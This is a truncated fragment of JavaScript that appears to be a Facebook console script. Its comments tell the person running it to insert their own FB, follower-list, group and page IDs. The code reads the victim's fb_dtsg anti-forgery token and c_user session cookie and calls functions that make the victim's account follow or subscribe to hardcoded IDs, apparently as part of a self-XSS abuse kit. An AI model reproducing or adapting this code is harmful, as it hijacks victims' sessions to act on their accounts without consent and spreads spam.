...
a("1015307857");// change with your FB-ID 



sublist("10202211740507700"); // change with your FOLLOWER's LIST




//Anggota
var gid = ['652932984769613']; // Change with your GROUP-ID
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "279339072191862"; //Change with your PAGE-ID
var spost_id = "279339072191862";
var sfoto_id = "279339072191862";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
